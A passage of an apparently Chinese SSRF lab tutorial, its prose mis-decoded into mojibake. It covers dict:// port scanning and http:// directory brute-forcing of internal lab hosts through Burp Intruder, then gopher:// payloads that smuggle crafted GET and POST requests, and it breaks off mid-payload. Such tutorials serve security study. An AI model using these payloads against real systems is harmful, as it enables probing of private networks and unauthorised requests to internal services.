title="SSRFä¿¡æ¯æ”¶é›†â€“dictä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£"></a>SSRFä¿¡æ¯æ”¶é›†â€“<code>dict</code>ä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£</h3><p>**ä½œç”¨ï¼š**å­—å…¸æœåŠ¡åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¯ç”¨äºæ‰«æç«¯å£ã€è·å–å†…ç½‘ä¿¡æ¯ã€çˆ†ç ´å¯†ç ç­‰</p><p><strong>æ ¼å¼ï¼š</strong><code>dict://[æœåŠ¡å™¨IP]:[ç«¯å£]/[å­—å…¸æ•°æ®åº“åç§°:å…³é”®å­—]</code></p><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dict:</span>//dict<span class="hljs-meta">.org</span>:<span class="hljs-number">2628</span>/moby-thesaurus:happy<br></code></pre></td></tr></table></figure><ul><li>**<code>dict.org</code>**æ˜¯å­—å…¸æœåŠ¡å™¨çš„åœ°å€</li><li>**<code>2628</code>**æ˜¯ç«¯å£å·</li><li>**<code>moby-thesaurus</code>**æ˜¯å­—å…¸æ•°æ®åº“çš„åç§°</li><li>**<code>happy</code>**æ˜¯è¦æŸ¥è¯¢çš„å…³é”®å­—</li></ul><p>å¯ä»¥ä½¿ç”¨<code>dict://</code>ä¼ªåè®®æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£ï¼Œä¸å…¶ç›¸ä¼¼çš„æ˜¯<code>ftp://</code>ä¼ªåè®®ï¼Œä½†æ˜¯<code>ftp://</code>ä¼ªåè®®æ•ˆç‡è¾ƒä½ï¼Œæ‰€ä»¥æœ€å¥½ä½¿ç”¨<code>dict://</code>ä¼ªåè®®</p><h4 id="æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£"><a href="#æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£" class="headerlink" title="æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£"></a>æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£</h4><p>å¦‚ä¸‹ï¼Œä»ä½¿ç”¨bpæŠ“åŒ…ï¼Œæ·»åŠ ç«¯å£å·</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.1:80</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422225838573.png" alt="image-20250422225838573"></p><p>å‘é€åˆ°<code>Intruder</code>ä¸­</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422230035341.png" alt="image-20250422230035341"></p><p>ç„¶åæ˜¯è¦ç¡®å®šè¿™æ¬¡çš„payloadç”±å“ªäº›éƒ¨åˆ†ç»„æˆ</p><ul><li>é¦–å…ˆæ˜¯ IP åœ°å€ï¼Œåœ¨å‰é¢å·²ç»ä½¿ç”¨<code>file://</code>ä¼ªåè®®è·å–äº†å­˜æ´»çš„ä¸»æœºçš„ IP åœ°å€ï¼Œå°±ä¸ç”¨è€ƒè™‘æœ‰å“ªäº›ä¸»æœºæ˜¯å­˜æ´»çš„</li><li>ç¬¬äºŒä¸ªå°±æ˜¯ç«¯å£ï¼Œè¿™æ¬¡å°±æ˜¯æµ‹è¯•æœ‰å“ªäº›ç«¯å£å¼€æ”¾</li></ul><p>å…ˆä½¿ç”¨<code>ftp://</code>ä¼ªåè®®è¿›è¡Œæ‰«æ1åˆ°14çš„IPçš„80ç«¯å£</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422230503939.png" alt="image-20250422230503939"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422230527664.png" alt="image-20250422230527664"></p><p>å¼€å§‹æ”»å‡»åé¦–å…ˆå°±ä¼šå‘ç°æ‰€éœ€çš„æ—¶é—´å¾ˆé•¿ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨ï¼Œå¯ä»¥æ‰“å¼€åˆ—ä¸­çš„æ¥æ”¶åˆ°å“åº”å’Œå“åº”å®Œæˆä¸¤ä¸ªé€‰é¡¹åˆ¤æ–­æ˜¯å¦å¼€å¯äº†80ç«¯å£ï¼Œå“åº”é•¿çš„éƒ½æ˜¯å¼€å¯äº†çš„</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422230933913.png" alt="image-20250422230933913"></p><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>dict://</code>ä¼ªåè®®æ‰«æ1åˆ°14ä¸»æœºï¼Œå¹¶ä¸”æ£€æµ‹ç«¯å£ï¼Œè¿™é‡Œå°±è¦é€‰æ‹©æ”»å‡»ç±»å‹ä¸ºé›†æŸç‚¸å¼¹</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422231338387.png" alt="image-20250422231338387"></p><p>ç¬¬ä¸€ä¸ªpayloadå’Œå‰é¢ä¸€æ ·æ˜¯1åˆ°14</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422231452206.png" alt="image-20250422231452206"></p><p>ç¬¬äºŒä¸ªpayloadé€‰æ‹©ç®€å•åˆ—è¡¨ï¼Œå¹¶æ·»åŠ ä¸€äº›ç«¯å£</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422231616457.png" alt="image-20250422231616457"></p><p>ç»è¿‡ä¸Šé¢çš„è®¾ç½®å°±å¯ä»¥æ‰«æ1åˆ°14è¿™äº›ä¸»æœºçš„æˆ‘ä»¬è®¾ç½®å¥½è¦æ‰«æçš„ç«¯å£</p><p>å¼€å§‹æ”»å‡»ï¼Œä¼šå‘ç°æ¯”ä½¿ç”¨<code>ftp://</code>ä¼ªåè®®å¿«å¾—å¤š</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422231900372.png" alt="image-20250422231900372"></p><p>å¯ä»¥é€šè¿‡é•¿åº¦åˆ—çš„æ•°å€¼è¾¨åˆ«è¯¥ä¸»æœºçš„ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œé‚£äº›æ•°å€¼å¤§çš„å°±æ˜¯å¼€æ”¾äº†çš„ï¼Œä¸‹é¢è¿™äº›å°±æ˜¯æ²¡æœ‰å¼€æ”¾ï¼Œå¯ä»¥çœ‹åˆ°æ•°å€¼æœ‰æ˜æ˜¾çš„åˆ†ç•Œçº¿</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422232121601.png" alt="image-20250422232121601"></p><h4 id="è·å–ç½‘ç«™ä¿¡æ¯"><a href="#è·å–ç½‘ç«™ä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç«™ä¿¡æ¯"></a>è·å–ç½‘ç«™ä¿¡æ¯</h4><p>åé¢åŠ å…¥å…³é”®å­—å°±å¯ä»¥è·å–ç½‘ç«™çš„ä¿¡æ¯äº†ï¼Œå¦‚<code>info</code></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.11:3306/info</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422232905611.png" alt="image-20250422232905611"></p><h3 id="SSRFä¿¡æ¯æ”¶é›†â€“httpä¼ªåè®®â€“ç›®å½•æ‰«æ"><a href="#SSRFä¿¡æ¯æ”¶é›†â€“httpä¼ªåè®®â€“ç›®å½•æ‰«æ" class="headerlink" title="SSRFä¿¡æ¯æ”¶é›†â€“httpä¼ªåè®®â€“ç›®å½•æ‰«æ"></a>SSRFä¿¡æ¯æ”¶é›†â€“<code>http</code>ä¼ªåè®®â€“ç›®å½•æ‰«æ</h3><p>**ä½œç”¨ï¼š**å¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«</p><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//user:password@example.com</span><br></code></pre></td></tr></table></figure><p>åœ¨SSRFä¸­å°±æ˜¯åˆ©ç”¨httpä¼ªåè®®è¿›è¡Œ<strong>ç›®å½•æ‰«æ</strong></p><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>æ¥ä¸‹æ¥å¯¹<code>172.250.250.4</code>çš„<code>80</code>ç«¯å£è¿›è¡Œç›®å½•æ‰«æï¼ŒæŸ¥çœ‹æœ‰å“ªäº›é¡µé¢</p><p>é¦–å…ˆé€šè¿‡SSRFæœåŠ¡å™¨ï¼Œä½¿ç”¨httpä¼ªåè®®è®¿é—®è¿™ä¸ªç½‘ç«™</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422233710257.png" alt="image-20250422233710257"></p><p>ä¾æ—§ä½¿ç”¨bpæŠ“åŒ…ï¼Œå¹¶æ”¾åˆ°<code>Intruder</code>ä¸­</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422233849976.png" alt="image-20250422233849976"></p><p>æ„é€ å‡ºå­é¡µé¢</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422234006520.png" alt="image-20250422234006520"></p><p>è¿™é‡Œåšç›®å½•æ‰«æå°±æ˜¯å°†<code>index</code>æ›¿æ¢æˆå…¶ä»–çš„å¸¸è§çš„åè¯</p><p>payloadé€‰æ‹©ç®€å•åˆ—è¡¨ï¼Œè¿™é‡Œè¦åŠ è½½å­—å…¸è¿›å»ï¼Œå­—å…¸å¯ä»¥åœ¨kaliä¸­è·å–ï¼Œæ–‡ä»¶è·¯å¾„å¦‚ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422234630012.png" alt="image-20250422234630012"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422234952423.png" alt="image-20250422234952423"></p><p>ç„¶åå¼€å§‹æ”»å‡»ï¼Œä¾æ—§æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422235918303.png" alt="image-20250422235918303"></p><p>å¯ä»¥è®¿é—®çœ‹çœ‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/phpinfo.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423001106200.png" alt="image-20250423001106200"></p><p>å¦‚æœä¸ç¡®å®šåç¼€åï¼Œå¯ä»¥å†æ·»åŠ ä¸€ä¸ªpayload</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423001227898.png" alt="image-20250423001227898"></p><h2 id="SSRFåˆ©ç”¨â€“gopherä¼ªåè®®å­¦ä¹ "><a href="#SSRFåˆ©ç”¨â€“gopherä¼ªåè®®å­¦ä¹ " class="headerlink" title="SSRFåˆ©ç”¨â€“gopherä¼ªåè®®å­¦ä¹ "></a>SSRFåˆ©ç”¨â€“gopherä¼ªåè®®å­¦ä¹ </h2><p><code>gopher://</code>ä¼ªåè®®å¯ä»¥ç†è§£ä¸º<code>http://</code>ä¼ªåè®®çš„å‰èº«</p><p><strong>åˆ©ç”¨èŒƒå›´ï¼š</strong><code>GETæäº¤</code>ã€<code>POSTæäº¤</code>ã€<code>Redis</code>ã€<code>Fastcgi</code>ã€<code>SQL</code></p><p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨<code>gopher</code>ä¼ªåè®®ï¼š</strong></p><ul><li>å½“éœ€è¦POSTæäº¤æ—¶ï¼Œå¯ä»¥åˆ©ç”¨<code>gopher</code>ä¼ªåè®®è¿›è¡ŒPOSTæäº¤</li><li><code>gopher</code>ä¼ªåè®®è¿˜å¯ä»¥å¯¹MySQLæ•°æ®åº“å‘èµ·ä¸€ä¸ªæœªæˆæƒè®¤è¯çš„æ”»å‡»æ—¶ï¼Œæäº¤TCPçš„æ•°æ®æµ</li></ul><p><strong>æ ¼å¼ï¼š</strong><code>URL:gopger://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p><p>webä¹Ÿéœ€è¦åŠ ç«¯å£å·80ï¼Œ<code>gopher</code>åè®®é»˜è®¤ç«¯å£ä¸º70</p><h3 id="gopherè¯·æ±‚ä¸è½¬å‘ç¬¬ä¸€ä¸ªå­—ç¬¦"><a href="#gopherè¯·æ±‚ä¸è½¬å‘ç¬¬ä¸€ä¸ªå­—ç¬¦" class="headerlink" title="gopherè¯·æ±‚ä¸è½¬å‘ç¬¬ä¸€ä¸ªå­—ç¬¦"></a><code>gopher</code>è¯·æ±‚ä¸è½¬å‘ç¬¬ä¸€ä¸ªå­—ç¬¦</h3><p>å¼€å¯ä¸¤ä¸ªkaliäº¤äº’é¡µé¢ï¼Œç”¨å…¶ä¸­ä¸€ä¸ªå‘æœ¬åœ°çš„7777ç«¯å£å‘é€<code>gopher</code>ä¼ªåè®®è¯·æ±‚</p><p>ç¬¬ä¸€ä¸ªé¡µé¢ç›‘å¬7777ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423003443809.png" alt="image-20250423003443809"></p><p>å¦ä¸€ä¸ªé¡µé¢å‘é€è¯·æ±‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/abcd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423003424298.png" alt="image-20250423003424298"></p><p>ä¼šå‘ç°å‘é€çš„æ˜¯<code>abcd</code>ï¼Œä½†æ¥æ”¶åˆ°çš„åªæœ‰<code>bcd</code></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423003533987.png" alt="image-20250423003533987"></p><p><code>gopher</code>è¯·æ±‚ä¸è½¬å‘ç¬¬ä¸€ä¸ªå­—ç¬¦</p><p>æ‰€ä»¥åœ¨æäº¤çš„æ—¶å€™è¦åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªå¡«å……ä½<code>_</code>ï¼Œè¿™ä¸ªå¡«å……ä½æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œåªæ˜¯ä¸ºäº†è®©å¯¹æ–¹å—åˆ°çš„æ•°æ®å®Œæ•´</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl gopher<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:7777/_abcd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423004628798.png" alt="image-20250423004628798"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423004637464.png" alt="image-20250423004637464"></p><p>å¯ä»¥çœ‹åˆ°æ¥æ”¶çš„æ•°æ®å®Œæ•´äº†</p><h3 id="ç®€å•å®éªŒ"><a href="#ç®€å•å®éªŒ" class="headerlink" title="ç®€å•å®éªŒ"></a>ç®€å•å®éªŒ</h3><p>åœ¨SSRFæœåŠ¡å™¨è®¿é—®å¦‚ä¸‹é¡µé¢</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423004946693.png" alt="image-20250423004946693"></p><p>è¿™ä¸ªä»£ç æ˜¯ä¼šå°†GETæˆ–POSTæäº¤çš„å€¼å›æ˜¾å‡ºæ¥</p><p>é¦–å…ˆä½¿ç”¨GETæäº¤</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/name.php?name=dazhunag</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423005131168.png" alt="image-20250423005131168"></p><p>ç„¶åæ˜¯POSTæäº¤ï¼Œä½†æ˜¯ä½¿ç”¨<code>http</code>ä¼ªåè®®ä¸èƒ½è¿›è¡ŒPOSTæäº¤ï¼Œå°±ç®—æ”¹æˆPOSTæäº¤ï¼Œä½†åªæ˜¯æäº¤ç»™SSRFè¿™ä¸ªæœåŠ¡å™¨ï¼ŒSSRFæœåŠ¡å™¨æ˜¯æ— æ³•å†POSTæäº¤ç»™å†…ç½‘ä¸»æœºçš„</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423005305165.png" alt="image-20250423005305165"></p><p>è¿™å°±è¦ä½¿ç”¨<code>gopher</code>ä¼ªåè®®äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>gopher</code>ä¼ªåè®®æäº¤ç»™SSRFæœåŠ¡å™¨ï¼ŒSSRFæœåŠ¡å™¨æ¥æ”¶åˆ°æäº¤çš„å†…å®¹åï¼Œä¼šè¿›è¡Œè§£æï¼Œç„¶åå¯ä»¥æ ¹æ®<code>gopher</code>ä¼ªåè®®é‡Œå®šä¹‰å¥½çš„GETæˆ–POSTæ–¹æ³•å»å†³å®šä½¿ç”¨ä»€ä¹ˆæ–¹æ³•å°†æ•°æ®å‘é€ç»™å†…ç½‘ä¸»æœº</p><h4 id="GETæäº¤"><a href="#GETæäº¤" class="headerlink" title="GETæäº¤"></a>GETæäº¤</h4><p>ä»¥ä¸‹æ˜¯æ­£å¸¸ä½¿ç”¨GETè¯·æ±‚çš„è¯·æ±‚åŒ…</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423010222009.png" alt="image-20250423010222009"></p><p><strong>éœ€è¦ä¿ç•™å¤´éƒ¨ä¿¡æ¯</strong></p><ul><li><strong>è·¯å¾„ï¼š</strong><code>GET /name.php?name=dazhuang HTTP/1.1</code></li><li><strong>ç›®æ ‡IPåœ°å€ï¼š</strong><code>Host: 172.250.250.4</code></li></ul><p><strong>æ„é€ POC</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/name.php?name=dazhuang</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š<strong>POCçš„æœ€åæ˜¯æœ‰ä¸€ä¸ª</strong>æ¢è¡Œç¬¦</strong>çš„ï¼Œæ¢è¡Œçš„ä¸Šé¢æ˜¯å¤´éƒ¨ä¿¡æ¯ï¼Œä¸‹é¢æ˜¯POSTè¯·æ±‚å†…å®¹ï¼Œè¿˜è¦æ³¨æ„æ·»åŠ <strong>ç«¯å£å·ï¼ˆ<code>80</code>ï¼‰<strong>å’Œ</strong>å¡«å……ä½ï¼ˆ<code>_</code>ï¼‰</strong></p><p>æœ€ç»ˆçš„POC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_GET%<span class="hljs-number">20</span>/name.php%<span class="hljs-number">3</span>fname=dazhuang%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>AHost:%<span class="hljs-number">20172</span>.<span class="hljs-number">250</span>.<span class="hljs-number">250</span>.<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><ul><li>**<code>%20</code>**æ˜¯ç©ºæ ¼</li><li>**<code>%3f</code>**æ˜¯é—®å·<code>?</code></li><li>**<code>%0d%0A</code>**æ˜¯æ¢è¡Œç¬¦</li></ul><p>è¿›è¡Œæäº¤</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423011020182.png" alt="image-20250423011020182"></p><p>ä¹Ÿå¯ä»¥ç”¨bpæŠ“åŒ…ï¼ŒæŠŠæ„é€ å¥½çš„åé¢çš„å†…å®¹æ”¾åˆ°bpé‡Œè¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼ˆå‘é€è¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡UäººLç¼–ç ï¼Œåœ¨å°†æ•°æ®å‘é€ç»™SSRFæœåŠ¡å™¨æ—¶SSRFæœåŠ¡å™¨ä¼šè¿›è¡Œä¸€æ¬¡URLè§£ç ï¼Œç„¶åSSRFæœåŠ¡å™¨å‘é€ç»™å†…ç½‘ä¸»æœºæ—¶å†…ç½‘ä¸»æœºä¼šè¿›è¡Œç¬¬äºŒæ¬¡URLè§£ç ï¼‰</p><p>ç¬¬ä¸€æ¬¡ç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423011541207.png" alt="image-20250423011541207"></p><p>ç¬¬äºŒæ¬¡ç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423012316053.png" alt="image-20250423012316053"></p><p>æœ€ç»ˆç»“æœ</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423012342123.png" alt="image-20250423012342123"></p><h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><ul><li>é—®å·éœ€è¦è¿›è¡ŒURLç¼–ç ä¸º<code>%3f</code></li><li>å›è½¦æ¢è¡Œè¦URLç¼–ç ä¸º<code>%0d%0a</code></li><li>åœ¨HTTPåŒ…çš„æœ€åè¦åŠ ä¸Š<code>%0d%0a</code>ï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸ</li><li>URLç¼–ç æ”¹ä¸ºå¤§å†™ï¼Œå†’å·æ³¨æ„è‹±æ–‡å†’å·</li><li>å¦‚æœä½¿ç”¨bpå‘åŒ…éœ€è¦è¿›è¡Œä¸¤æ¬¡URLç¼–ç </li><li>GETæäº¤æœ€åéœ€è¦å¢åŠ ä¸€ä¸ªæ¢è¡Œç¬¦</li></ul><h4 id="POSTæäº¤"><a href="#POSTæäº¤" class="headerlink" title="POSTæäº¤"></a>POSTæäº¤</h4><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423013351894.png" alt="image-20250423013351894"></p><p><strong>éœ€è¦ä¿ç•™å¤´éƒ¨ä¿¡æ¯ï¼š</strong></p><ul><li>POST</li><li>Host:</li><li>Content-Type:</li><li>Content-Length:</li></ul><p><strong>æ„é€ POC</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/name.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>13<br><br><span class="language-abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>jianjian</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong><code>Content-Length</code>çš„å€¼è¦å’Œå®é™…æäº¤çš„é•¿åº¦ä¸€è‡´ï¼Œå¦åˆ™ä½ å®šä¹‰çš„é•¿åº¦å¤šå°‘ï¼Œæœ€ç»ˆè¯»å–åˆ°çš„å°±æ˜¯å¤šå°‘ï¼Œå¦‚ï¼šå®é™…æ˜¯13ï¼Œå®šä¹‰ä¸º11ï¼Œæœ€ç»ˆåªä¼šè¯»<code>name=jianji</code>ï¼Œè¿˜æœ‰å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ä¹Ÿè¦ä¸€è‡´</p><p>å¯ä»¥åƒå‰é¢GETä¸€æ ·ï¼Œè¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨bpçš„ç¼–ç å·¥å…·è¿›è¡Œä¸¤æ¬¡ç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423013736219.png" alt="image-20250423013736219"></p><p>æœ€ç»ˆPOC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span 